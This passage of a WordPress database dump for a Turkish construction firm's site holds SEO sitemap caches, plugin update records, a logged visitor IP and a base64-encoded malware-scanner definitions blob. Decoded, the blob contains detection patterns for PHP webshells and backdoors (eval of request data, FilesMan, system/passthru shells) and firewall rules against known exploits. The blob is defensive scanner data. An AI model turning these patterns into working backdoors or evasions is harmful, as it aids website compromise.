		<loc>https://www.herkonyapi.com/cozum-ortaklari/winsa-011/</loc>
		<lastmod>2014-08-29T22:56:29+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/Winsa-011.png</image:loc>
			<image:title><![CDATA[Winsa-011]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/yuksel_elektrik/</loc>
		<lastmod>2014-08-29T22:56:32+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/yuksel_elektrik.png</image:loc>
			<image:title><![CDATA[yuksel_elektrik]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/ege_seramik/</loc>
		<lastmod>2014-08-29T23:04:36+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/ege_seramik.jpg</image:loc>
			<image:title><![CDATA[ege_seramik]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/franke/</loc>
		<lastmod>2014-08-29T23:06:28+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/franke.gif</image:loc>
			<image:title><![CDATA[franke]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/mitsubishi_klima/</loc>
		<lastmod>2014-08-29T23:09:36+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/mitsubishi_klima.png</image:loc>
			<image:title><![CDATA[mitsubishi_klima]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/herkon-yapi/4-3/</loc>
		<lastmod>2014-08-30T00:38:04+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/4.jpg</image:loc>
			<image:title><![CDATA[4]]></image:title>
		</image:image>
	</url>
</urlset>\";}}","no");
INSERT INTO `cmrfu_options` VALUES("20608","wpseo_sitemap_post_tag_cache_validator","4h3Mj","no");
INSERT INTO `cmrfu_options` VALUES("21138","_transient_doing_cron","1490284125.1069068908691406250000","yes");
INSERT INTO `cmrfu_options` VALUES("21136","_transient_timeout_yst_sm_1_1:3bWtF_3ytVl","1490367082","no");
INSERT INTO `cmrfu_options` VALUES("20611","_transient_timeout_yst_sm_category_1:3bWtF_2ijcc","1489614709","no");
INSERT INTO `cmrfu_options` VALUES("20612","_transient_yst_sm_category_1:3bWtF_2ijcc","C:24:\"WPSEO_Sitemap_Cache_Data\":472:{a:2:{s:6:\"status\";s:2:\"ok\";s:3:\"xml\";s:425:\"<urlset xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:image=\"http://www.google.com/schemas/sitemap-image/1.1\" xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\" xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">
	<url>
		<loc>https://www.herkonyapi.com/category/genel/</loc>
		<lastmod>2014-06-02T14:25:06+03:00</lastmod>
	</url>
</urlset>\";}}","no");
INSERT INTO `cmrfu_options` VALUES("20955","_transient_timeout_yst_sm_portfolio_1:3bWtF_5Y1s","1489768685","no");
INSERT INTO `cmrfu_options` VALUES("20956","_transient_yst_sm_portfolio_1:3bWtF_5Y1s","C:24:\"WPSEO_Sitemap_Cache_Data\":4134:{a:2:{s:6:\"status\";s:2:\"ok\";s:3:\"xml\";s:4086:\"<urlset xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:image=\"http://www.google.com/schemas/sitemap-image/1.1\" xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\" xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/</loc>
		<lastmod>2014-06-02T13:40:27+03:00</lastmod>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/alpay-konak-dukkan/</loc>
		<lastmod>2014-06-02T12:30:05+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/9.jpg</image:loc>
			<image:title><![CDATA[9]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/alpay-konak-kat-3/</loc>
		<lastmod>2014-06-02T13:09:09+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/New_1.jpg</image:loc>
			<image:title><![CDATA[New_1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/hervenik-apartman-daire-4/</loc>
		<lastmod>2014-06-02T13:13:53+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/92.jpg</image:loc>
			<image:title><![CDATA[9]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/hervenik-dubleks-6/</loc>
		<lastmod>2014-06-02T13:16:26+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/81.jpg</image:loc>
			<image:title><![CDATA[8]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/kalipci-sokak-sude-apartman-dubleks/</loc>
		<lastmod>2014-06-02T13:20:30+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/New_21.jpg</image:loc>
			<image:title><![CDATA[New_2]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/kalipci-sokak-sude-apartman-giris-kat/</loc>
		<lastmod>2014-06-02T13:22:58+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/13.jpg</image:loc>
			<image:title><![CDATA[1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/kalipci-sokak-sude-apartman-kat-2/</loc>
		<lastmod>2014-06-02T13:27:27+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/102.jpg</image:loc>
			<image:title><![CDATA[10]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-1-1/</loc>
		<lastmod>2014-06-02T13:31:46+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/14.jpg</image:loc>
			<image:title><![CDATA[1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-3-1/</loc>
		<lastmod>2014-06-02T13:32:55+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/34.jpg</image:loc>
			<image:title><![CDATA[3]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-3-1-on/</loc>
		<lastmod>2014-06-02T13:33:27+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/16.jpg</image:loc>
			<image:title><![CDATA[1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-on-dubleks/</loc>
		<lastmod>2014-06-02T13:38:26+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/25.jpg</image:loc>
			<image:title><![CDATA[2]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/sisli-arka-dubleks/</loc>
		<lastmod>2014-06-02T13:40:27+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/107.jpg</image:loc>
			<image:title><![CDATA[10]]></image:title>
		</image:image>
	</url>
</urlset>\";}}","no");
INSERT INTO `cmrfu_options` VALUES("21072","_transient_timeout_users_online","1490179229","no");
INSERT INTO `cmrfu_options` VALUES("21128","_site_transient_update_themes","O:8:\"stdClass\":4:{s:12:\"last_checked\";i:1490267702;s:7:\"checked\";a:1:{s:7:\"er-leaf\";s:5:\"1.1.2\";}s:8:\"response\";a:0:{}s:12:\"translations\";a:0:{}}","no");
INSERT INTO `cmrfu_options` VALUES("21129","_site_transient_update_plugins","O:8:\"stdClass\":4:{s:12:\"last_checked\";i:1490267700;s:8:\"response\";a:1:{s:24:\"wordpress-seo/wp-seo.php\";O:8:\"stdClass\":8:{s:2:\"id\";s:4:\"5899\";s:4:\"slug\";s:13:\"wordpress-seo\";s:6:\"plugin\";s:24:\"wordpress-seo/wp-seo.php\";s:11:\"new_version\";s:3:\"4.5\";s:3:\"url\";s:44:\"https://wordpress.org/plugins/wordpress-seo/\";s:7:\"package\";s:60:\"https://downloads.wordpress.org/plugin/wordpress-seo.4.5.zip\";s:6:\"tested\";s:5:\"4.7.3\";s:13:\"compatibility\";O:8:\"stdClass\":1:{s:6:\"scalar\";O:8:\"stdClass\":1:{s:6:\"scalar\";b:0;}}}}s:12:\"translations\";a:2:{i:0;a:7:{s:4:\"type\";s:6:\"plugin\";s:4:\"slug\";s:14:\"contact-form-7\";s:8:\"language\";s:5:\"tr_TR\";s:7:\"version\";s:5:\"4.6.1\";s:7:\"updated\";s:19:\"2016-12-20 20:38:21\";s:7:\"package\";s:81:\"https://downloads.wordpress.org/translation/plugin/contact-form-7/4.6.1/tr_TR.zip\";s:10:\"autoupdate\";b:1;}i:1;a:7:{s:4:\"type\";s:6:\"plugin\";s:4:\"slug\";s:13:\"wordpress-seo\";s:8:\"language\";s:5:\"tr_TR\";s:7:\"version\";s:5:\"3.2.5\";s:7:\"updated\";s:19:\"2016-04-24 14:07:46\";s:7:\"package\";s:80:\"https://downloads.wordpress.org/translation/plugin/wordpress-seo/3.2.5/tr_TR.zip\";s:10:\"autoupdate\";b:1;}}s:9:\"no_update\";a:11:{s:19:\"akismet/akismet.php\";O:8:\"stdClass\":6:{s:2:\"id\";s:2:\"15\";s:4:\"slug\";s:7:\"akismet\";s:6:\"plugin\";s:19:\"akismet/akismet.php\";s:11:\"new_version\";s:3:\"3.3\";s:3:\"url\";s:38:\"https://wordpress.org/plugins/akismet/\";s:7:\"package\";s:54:\"https://downloads.wordpress.org/plugin/akismet.3.3.zip\";}s:51:\"all-in-one-wp-security-and-firewall/wp-security.php\";O:8:\"stdClass\":6:{s:2:\"id\";s:5:\"41309\";s:4:\"slug\";s:35:\"all-in-one-wp-security-and-firewall\";s:6:\"plugin\";s:51:\"all-in-one-wp-security-and-firewall/wp-security.php\";s:11:\"new_version\";s:5:\"4.2.5\";s:3:\"url\";s:66:\"https://wordpress.org/plugins/all-in-one-wp-security-and-firewall/\";s:7:\"package\";s:78:\"https://downloads.wordpress.org/plugin/all-in-one-wp-security-and-firewall.zip\";}s:16:\"gotmls/index.php\";O:8:\"stdClass\":7:{s:2:\"id\";s:5:\"29304\";s:4:\"slug\";s:6:\"gotmls\";s:6:\"plugin\";s:16:\"gotmls/index.php\";s:11:\"new_version\";s:7:\"4.16.53\";s:3:\"url\";s:37:\"https://wordpress.org/plugins/gotmls/\";s:7:\"package\";s:57:\"https://downloads.wordpress.org/plugin/gotmls.4.16.53.zip\";s:14:\"upgrade_notice\";s:153:\"Fixed the details window to scrolls to the highlighted code, set default Potential Threat scan to disabled, and encoded definitions array for DB storage.\";}s:36:\"contact-form-7/wp-contact-form-7.php\";O:8:\"stdClass\":6:{s:2:\"id\";s:3:\"790\";s:4:\"slug\";s:14:\"contact-form-7\";s:6:\"plugin\";s:36:\"contact-form-7/wp-contact-form-7.php\";s:11:\"new_version\";s:3:\"4.7\";s:3:\"url\";s:45:\"https://wordpress.org/plugins/contact-form-7/\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/plugin/contact-form-7.4.7.zip\";}s:9:\"hello.php\";O:8:\"stdClass\":6:{s:2:\"id\";s:4:\"3564\";s:4:\"slug\";s:11:\"hello-dolly\";s:6:\"plugin\";s:9:\"hello.php\";s:11:\"new_version\";s:3:\"1.6\";s:3:\"url\";s:42:\"https://wordpress.org/plugins/hello-dolly/\";s:7:\"package\";s:58:\"https://downloads.wordpress.org/plugin/hello-dolly.1.6.zip\";}s:35:\"jquery-colorbox/jquery-colorbox.php\";O:8:\"stdClass\":6:{s:2:\"id\";s:5:\"12036\";s:4:\"slug\";s:15:\"jquery-colorbox\";s:6:\"plugin\";s:35:\"jquery-colorbox/jquery-colorbox.php\";s:11:\"new_version\";s:5:\"4.6.2\";s:3:\"url\";s:46:\"https://wordpress.org/plugins/jquery-colorbox/\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/plugin/jquery-colorbox.4.6.2.zip\";}s:39:\"lockdown-wp-admin/lockdown-wp-admin.php\";O:8:\"stdClass\":6:{s:2:\"id\";s:5:\"19836\";s:4:\"slug\";s:17:\"lockdown-wp-admin\";s:6:\"plugin\";s:39:\"lockdown-wp-admin/lockdown-wp-admin.php\";s:11:\"new_version\";s:5:\"2.3.2\";s:3:\"url\";s:48:\"https://wordpress.org/plugins/lockdown-wp-admin/\";s:7:\"package\";s:66:\"https://downloads.wordpress.org/plugin/lockdown-wp-admin.2.3.2.zip\";}s:47:\"really-simple-captcha/really-simple-captcha.php\";O:8:\"stdClass\":6:{s:2:\"id\";s:4:\"7028\";s:4:\"slug\";s:21:\"really-simple-captcha\";s:6:\"plugin\";s:47:\"really-simple-captcha/really-simple-captcha.php\";s:11:\"new_version\";s:3:\"1.9\";s:3:\"url\";s:52:\"https://wordpress.org/plugins/really-simple-captcha/\";s:7:\"package\";s:68:\"https://downloads.wordpress.org/plugin/really-simple-captcha.1.9.zip\";}s:20:\"smtp-mailer/main.php\";O:8:\"stdClass\":6:{s:2:\"id\";s:5:\"67448\";s:4:\"slug\";s:11:\"smtp-mailer\";s:6:\"plugin\";s:20:\"smtp-mailer/main.php\";s:11:\"new_version\";s:5:\"1.0.3\";s:3:\"url\";s:42:\"https://wordpress.org/plugins/smtp-mailer/\";s:7:\"package\";s:54:\"https://downloads.wordpress.org/plugin/smtp-mailer.zip\";}s:41:\"wordpress-importer/wordpress-importer.php\";O:8:\"stdClass\":6:{s:2:\"id\";s:5:\"14975\";s:4:\"slug\";s:18:\"wordpress-importer\";s:6:\"plugin\";s:41:\"wordpress-importer/wordpress-importer.php\";s:11:\"new_version\";s:5:\"0.6.3\";s:3:\"url\";s:49:\"https://wordpress.org/plugins/wordpress-importer/\";s:7:\"package\";s:67:\"https://downloads.wordpress.org/plugin/wordpress-importer.0.6.3.zip\";}s:27:\"wp-super-cache/wp-cache.php\";O:8:\"stdClass\":7:{s:2:\"id\";s:4:\"1221\";s:4:\"slug\";s:14:\"wp-super-cache\";s:6:\"plugin\";s:27:\"wp-super-cache/wp-cache.php\";s:11:\"new_version\";s:5:\"1.4.9\";s:3:\"url\";s:45:\"https://wordpress.org/plugins/wp-super-cache/\";s:7:\"package\";s:63:\"https://downloads.wordpress.org/plugin/wp-super-cache.1.4.9.zip\";s:14:\"upgrade_notice\";s:139:\"Fixed XSS on the settings page, settings page updates, file locking fixes and PHP 7.1 fix, caching fixes on static homepage blogs and more.\";}}}","no");
INSERT INTO `cmrfu_options` VALUES("21073","_transient_users_online","a:1:{i:0;a:3:{s:7:\"user_id\";i:1;s:13:\"last_activity\";d:1490184629;s:10:\"ip_address\";s:12:\"91.239.81.62\";}}","no");
INSERT INTO `cmrfu_options` VALUES("20475","GOTMLS_definitions_blob","YTo4OntzOjk6InBvdGVudGlhbCI7YToxNTp7czo=OiJldmFsIjthOjI6e2k6MDtzOjU6IkVBUExxIjtpOjE7czozNToiL1teYS16XC8nIl1ldmFsXChbXlwpXStbJyJcc1wpO1=rL2kiO31zOjE1OiJwcmVnX3JlcGxhY2UgL2UiO2E6Mjp7aTowO3M6NToiRzg1RjIiO2k6MTtzOjQ3OiIvcHJlZ19yZXBsYWNlXHMqXCguK1tcL1wjXHxdW2ldKmVbaV=qWyciXS4rXCkvaSI7fXM6OToiYXV=aF9wYXNzIjthOjI6e2k6MDtzOjU6IkgxTjlZIjtpOjE7czoyMToiL1wkYXV=aF9wYXNzXHMqPS4rOy9pIjt9czo=MzoiZnVuY3Rpb24gYWRkX2FjdGlvbiB3cF9lbnF1ZXVlX3NjcmlwdCBqc29uMiI7YToyOntpOjA7czo1OiJGMTE=diI7aToxO3M6MTc6Ii9qc29uMlwubWluXC5qcy9pIjt9czoxMToiVGFnZ2VkIENvZGUiO2E6Mjp7aTowO3M6NToiRTRMTUciO2k6MTtzOjI=OiIvXCMoXHcrKVwjLis_XCNcL1wxXCMvaXMiO31zOjIyOiJwcm9=ZWN=ZWQgYnkgY29weXJpZ2h=IjthOjI6e2k6MDtzOjU6IkQ4TUN3IjtpOjE7czoxMzY6Ii9cL1wqIFRoaXMgZmlsZSBpcyBwcm9=ZWN=ZWQgYnkgY29weXJpZ2h=IGxhdyBhbmQgcHJvdmlkZWQgdW5kZXIgbGljZW5zZS4gUmV2ZXJzZSBlbmdpbmVlcmluZyBvZiB=aGlzIGZpbGUgaXMgc3RyaWN=bHkgcHJvaGliaXRlZC4gXCpcLy8iO31zOjIwOiJleGVjIHN5c3RlbSBwYXNzdGhydSI7YToyOntpOjA7czo1OiJFQVBMZyI7aToxO3M6NTE6Ii88XD8uKz9leGVjXCguKz9zeXN=ZW1cKC4rP3Bhc3N=aHJ1XCguK2Z3cml=ZVwoLisvcyI7fXM6Mjk6IkV4dGVybmFsIFJlZGlyZWN=IFJld3JpdGVSdWxlIjthOjI6e2k6MDtzOjU6IkYxVUlaIjtpOjE7czo=MjoiL1Jld3JpdGVSdWxlIFteIF=rIGh=dHBcOlwvXC8oPyExMjdcLikuKi9pIjt9czozNToibm8gZXJyb3JfcmVwb3J=aW5nIGxvbmcgbGluZXMgYWxvbmUiO2E6Mjp7aTowO3M6NToiSDJTOGoiO2k6MTtzOjc=OiIvPFw_W1xzaHBdKlxAP2Vycm9yX3JlcG9ydGluZ1woMFwpOy4rP1thLXowLTlcL1wtXD=nIlwuXXsyMDAwfS4qPygkfFw_PikvaSI7fXM6MTk6ImEgc3BhbiBjb2xvciBGMUVGRTQiO2E6Mjp7aTowO3M6NToiRDhSQVAiO2k6MTtzOjExODoiL1w8YSBbXlw-XStcPlw8c3BhbiBzdHlsZT=iY29sb3JcOlwjRjFFRkU=OyJcPiguKz8pXDxcL3NwYW5cPlw8XC9hXD5cPHNwYW4gc3R5bGU9ImNvbG9yXDpcI=YxRUZFNDsiXD4oLis_KVw8XC9zcGFuXD4vaSI7fXM6MTc6IlZhcmlhYmxlIEZ1bmN=aW9uIjthOjI6e2k6MDtzOjU6IkU4NTZMIjtpOjE7czo2NzoiLyg8IVxkKVwkW1wkXHtdKlthLXpcLVxfMC=5XStbXH=gXHRdKihcW1teXF1dK1xdWyBcdF=qKSpcKC4qP1wpXDsvaSI7fXM6MTU6ImNyZWF=ZV9mdW5jdGlvbiI7YToyOntpOjA7czo1OiJHMU1GZSI7aToxO3M6Nzg6Ii8oXCRbYS16XzAtOV=rWz1cc1xAXSspP2NyZWF=ZV9mdW5jdGlvblwoW14sXSssW1xzXCRcLlxbXF1hLXpfMC=5XStbXHNcKV=rOyovaSI7fXM6NDc6IlJld3JpdGVDb25kIEhUVFBfVVNFUl9BR=VOVCBSZXdyaXRlUnVsZSBodHRwIElQIjthOjI6e2k6MDtzOjU6IkYyNzdoIjtpOjE7czo4NDoiLyhSZXdyaXRlQ29uZCBcJVx7SFRUUF9VU=VSX=FHRU5UXH=gLitccyspK1Jld3JpdGVSdWxlIFxeLipcJCBodHRwOlwvXC8oPyExMjdcLikuKi9pIjt9czoxMjoidGl=bGUgaGFja2VkIjthOjI6e2k6MDtzOjU6IkgyUzhtIjtpOjE7czoyNzoiLzx=aXRsZT5bXjxdKmhhY2tbM2VdW3JkXS9pIjt9czoyMToiZG9jdW1lbnQud3JpdGUgaWZyYW1lIjthOjI6e2k6MDtzOjU6IkgxUEFPIjtpOjE7czo1MjoiL2RvY3VtZW5=XC53cml=ZVwoKFsnIl=pPGlmcmFtZSAuKzxcL2lmcmFtZT5cMVwpOyovaSI7fX1zOjg6ImZpcmV3YWxsIjthOjM6e3M6OToiUmV2U2xpZGVyIjthOjc6e2k6MDtzOjU6IkdCS=ZyIjtpOjE7czozNjoiUmV2b2x1dGlvbiBTbGlkZXIgRXhwbG9pdCBQcm9=ZWN=aW9uIjtpOjI7czo=MTM6IlRoaXMgcHJvdGVjdGlvbiBpcyBhdXRvbWF=aWNhbGx5IGFjdGl2YXRlZCBiZWNhdXNlIG9mIHRoZSB3aWRlc3ByZWFkIGF=dGFja3Mgb24gV29yZFByZXNzIHRoYXQgaGF2ZSBhZmZlY3RlZCBzbyBtYW55IHNpdGVzLiBJdCBpcyBzdGlsbCByZWNvbW1lbmRlZCB=aGF=IHlvdSBtYWtlIHN1cmUgdG8gdXBncmFkZSBhbnkgb2xkZXIgdmVyc2lvbnMgb2YgdGhlIFJldm9sdXRpb24gU2xpZGVyIHBsdWdpbiwgZXNwZWNpYWxseSB=aG9zZSBpbmNsdWRlZCBpbiB=aGVtZXMgdGhhdCB3aWxsIG5vdCB1cGRhdGUgYXV=b21hdGljYWxseS4gRXZlbiBpZiB5b3UgZG9uJ3QgdGhpbmsgeW91IGhhdmUgUmV2b2x1dGlvbiBTbGlkZXIgb24geW91ciBzaXRlIGl=IGRvZW4ndCBodXJ=IHRvIGhhdmUgdGhpcyBwcm9=ZWN=aW9uIGVuYWJsZWQuIjtpOjM7czo2OiJTRVJWRVIiO2k6NDtzOjIwOiIvXC9hZG1pbi1hamF4XC5waHAvaSI7aTo1O3M6NzoiUkVRVUVTVCI7aTo2O3M6MTE5OiIvXCZpbWc9W15cJl=qKD88IVwucG5nKSg_PCFcLmpwZykoPzwhXC5qcGVnKSg_PCFcLmdpZikoPzwhXC5ibXApKD88IVwudGlmKSg_PCFcLnRpZmYpKD88IVwucHNkKSg_PCFcLnN2ZykoPzwhXC5pY28pXCYvaSI7fXM6OToiVHJhdmVyc2FsIjthOjU6e2k6MDtzOjU6IkdCS=M4IjtpOjE7czozMDoiRGlyZWN=b3J5IFRyYXZlcnNhbCBQcm9=ZWN=aW9uIjtpOjI7czoyMTY6IlRoaXMgcHJvdGVjdGlvbiBpcyBhdXRvbWF=aWNhbGx5IGFjdGl2YXRlZCBiZWNhdXNlIHRoaXMgdHlwZSBvZiBhdHRhY2sgaXMgcXVpdGUgY29tbW9uLiBUaGlzIHByb3RlY3Rpb24gY2FuIHByZXZlbnQgaGFja2VycyBmcm9tIGFjY2Vzc2luZyBzZWN1cmUgZmlsZXMgaW4gcGFyZW5=IGRpcmVjdG9yaWVzIChvciB1c2VyJ3MgZm9sZGVycyBvdXRzaWRlIHRoZSBzaXRlX3Jvb3QpLiI7aTozO3M6NzoiUkVRVUVTVCI7aTo=O3M6MjI6Ii89W1xzXC9dKihcLlwufGV=YylcLy8iO31zOjk6IlVwbG9hZFBIUCI7YTo1OntpOjA7czo1OiJHQ=9BVCI7aToxO3M6MjY6IlVwbG9hZCBQSFAgRmlsZSBQcm9=ZWN=aW9uIjtpOjI7czoxNzc6IlRoaXMgcHJvdGVjdGlvbiBpcyBhdXRvbWF=aWNhbGx5IGFjdGl2YXRlZCBiZWNhdXNlIHRoaXMgdHlwZSBvZiBhdHRhY2sgaXMgZXh=cmVtZWx5IGRhbmdlcm91cy4gVGhpcyBwcm9=ZWN=aW9uIGNhbiBwcmV2ZW5=IGhhY2tlcnMgZnJvbSB1cGxvYWRpbmcgbWFsaWNpb3VzIGNvZGUgdmlhIHdlYiBzY3JpcHRzLiI7aTozO3M6NToiRklMRVMiO2k6NDtzOjIwOiIvbmFtZT1bXlwmXSpcLnBocFwmLyI7fX1zOjg6ImJhY2tkb29yIjthOjg2OntzOjIxOiJzaGVsbCBzeXN=ZW=gcGFzc3RocnUiO2E6Mjp7aTowO3M6NToiRDhESjkiO2k6MTtzOjk5OiIvXDxcPyguKz8pKHNoZWxsfGF1dGhwKSguKz8pZXJyb3JfcmVwb3J=aW5nXCgwXCkoLis_KXNldF9=aW1lX2xpbWl=XCgwXCkoLis_KWluaV9zZXRcKC4rZm9wZW5cKC4rL3MiO31zOjE4OiJhdXRoX3Bhc3MgRmlsZXNNYW4iO2E6Mjp7aTowO3M6NToiSDE2R3QiO2k6MTtzOjIwNDoiLzxcP1twaFxzXStpZltcc1woXStpc3NldFxzKlwoXHMqXCRfKFJFUVVFU3xHRXxQT1MpVFxbKFsnIl=pKFthLXpfMC=5XSspXDJbXlx7XStce1xzKnN3aXRjaCBcKFwkX1wxVFxbXDJcM1wyXF=uKz9kZWZhdWx=OlteXH1dK1tcfVxzXStkaWVcKFteXH1dK1tcfVxzXStpZltcc1woXStcJHdwZGJcLT5nZXRfdmFyXCguKz9leGl=O1tcfVxzXSsoJHxcPz4pL2lzIjt9czoyNjoiR=VUZG9fcmVtb3ZlIHNhZmVfbW9kZSBlbmQiO2E6Mjp7aTowO3M6NToiQ=NVTDMiO2k6MTtzOjExNDoiL2lmXChcJF9HRVRcWydkbydcXT=9InJlbW92ZSJcKVx7XG51bmxpbmtcKGdldGN3ZFwoXClcLlwkX1NFUlZFUlxbIlNDUklQVF9OQU1FIlxdXCk7LitzYWZlX21vZGUuK2Vsc2UuKydcLlwkZW5kOy9zIjt9czo=MDoic2V=X2Vycm9yX2hhbmRsZXIgZXZhbCBmaWxlX2dldF9jb25=ZW5=cyI7YToyOntpOjA7czo1OiJGOVM5VyI7aToxO3M6MTI=OiIvKGVycm9yX3JlcG9ydGluZ1woLis_fHNldF9lcnJvcl9oYW5kbGVyXCguKz8pKmV2YWxcKFteXCldKj8oXCRyZXF1ZXN=fHN=cnJldlwoKVteXCldKj9maWxlX2dldF9jb25=ZW5=c1woJ1teJ1=rJ1tcKVxzXSs7L2lzIjt9czoyMDoiR=VUX2RsIHNhZmVfbW9kZSBlbmQiO2E6Mjp7aTowO3M6NToiRUNTRVYiO2k6MTtzOjEwMDoiLzxcP1twaFxzXStpZlwoaXNzZXRcKFwkX=dFVFxbWyciXWRsWyInXVxdXCkuKz9zYWZlX21vZGUuKz9cPz4oXHMqPFwvZGl2PlxzKjxcL2JvZHk-XHMqPFwvaHRtbD4pPy9pcyI7fXM6MTA6InVuc2V=IHNlbGYiO2E6Mjp7aTowO3M6NToiSDJTSmoiO2k6MTtzOjM=MjoiLyhcJFthLXpfMC=5XSspXHMqPVxzKl9fRklMRV9fLit1bnNldFwoXHMqXDFbXClcc1=qO1xzKnw8XD9bXHNocF=qKFxAP2NobW9kXChbXlwpXStcKTtccyopKmlmW1xzXChcIV=rKGlzc2V=fGVtcHR5KVtcc1woXStcJF8oUkVRVUVTVHxHRVR8UE9TVHxDT=9LSUUpW15ce1=rW1x7XHNdKihcJFthLXpfMC=5XHtcfV=rKVxzKj=uKz9ta2Rpcltcc1woIidcLlwvXStcNVtcKTtcc1=rZm9yZWFjaC4rP1x7W15cfV=rXH1ccyooaWZbXHNcKFwhXStpc19kaXJbXlwpXStcKStbXHtcc1xAXSpta2Rpcltcc1woXStbXlwpXStcKSs7W1xzXH1dKikrLio_KHVubGlua1woW15cKV=rXCk7XHMqKSsoJHxcPz4pL2lzIjt9czoyMzoiY2xlYXJzdGF=Y2FjaGUgaGVyZSBkaWUiO2E6Mjp7aTowO3M6NToiRDVFQTUiO2k6MTtzOjE=MjoiLzxcPyhwaHApP1sgXHRcclxuXSsoaWZcKGlzc2V=XChcJF9HRVRcW1snIl1bMC=5YS16QS1aXStbJyJdXF1cKVwpWyBcdFxyXG5dKlx7WyBcdFxyXG5dKyk_Y2xlYXJzdGF=Y2FjaGUuK2hlcmU7WyBcdFxyXG5dK2RpZTtbXH=gXHRcclxuXStcPz4vcyI7fXM6MjE6ImtleXNwYXQgdmlhZ3JhIGNpYWxpcyI7YToyOntpOjA7czo1OiJEMU9OMyI7aToxO3M6MTIwOiIvZXJyb3JfcmVwb3J=aW5nXCgwXCk7WyBcdFxyXG5dK1wka2V5c3BhdFs9IFx=XSthcnJheVwoWyBcdFxyXG5dKihbJyJdKHZpYWdyYXxhbW94aWNpbGxpbnxjaWFsaXMpWyciXVsgXHRcclxuLF=rKXsyfS4rL3MiO31zOjE4OiJldmFsIFJFUVVFU1QgYWxvbmUiO2E6Mjp7aTowO3M6NToiRjRQTFAiO2k6MTtzOjE2MjoiLzxcP1twaFxzXSsoKFwkW2EtelxfMC=5XSspXHMqPVxzKlwkXyhSRVFVRVN8R=V8UE9TKVRbXjtdKztccyopP1xAP2V2YWwoW1woXHMqXEBdK3N=cmlwc2xhc2hlcyk_W1woXHMqXEBdKyhcMnxcJF8oUkVRVUVTfEdFfFBPUylUXHMqKFxbW15cXV=rXF1ccyopKylbXCk7XHNdK1w_Pi9pIjt9czozMzoiYXV=aF9wYXNzIEZpbGVzTWFuIHNhZmVfbW9kZSBldmFsIjthOjI6e2k6MDtzOjU6IkgxNkJQIjtpOjE7czo3NzoiL1w8XD8oPz=uKlwkYXV=aF9wYXNzKSg_PS4qRmlsZXNNYW4pKD89LipzYWZlX21vZGUpKD89LiooZXZhbHxuZXRzdGF=KVwoKS4rL3MiO31zOjE4OiJldmFsIGJhc2U2NF9kZWNvZGUiO2E6Mjp7aTowO3M6NToiRzhVTnIiO2k6MTtzOjMwMjoiLyhcQD8oKGVycm9yX3JlcG9ydGluZ3xpbmlfKHNldHxyZXN=b3JlKSlcKFteXCldKlwpfFwkW2EtelxfMC=5XStccyo9XHMqW147XSspO1x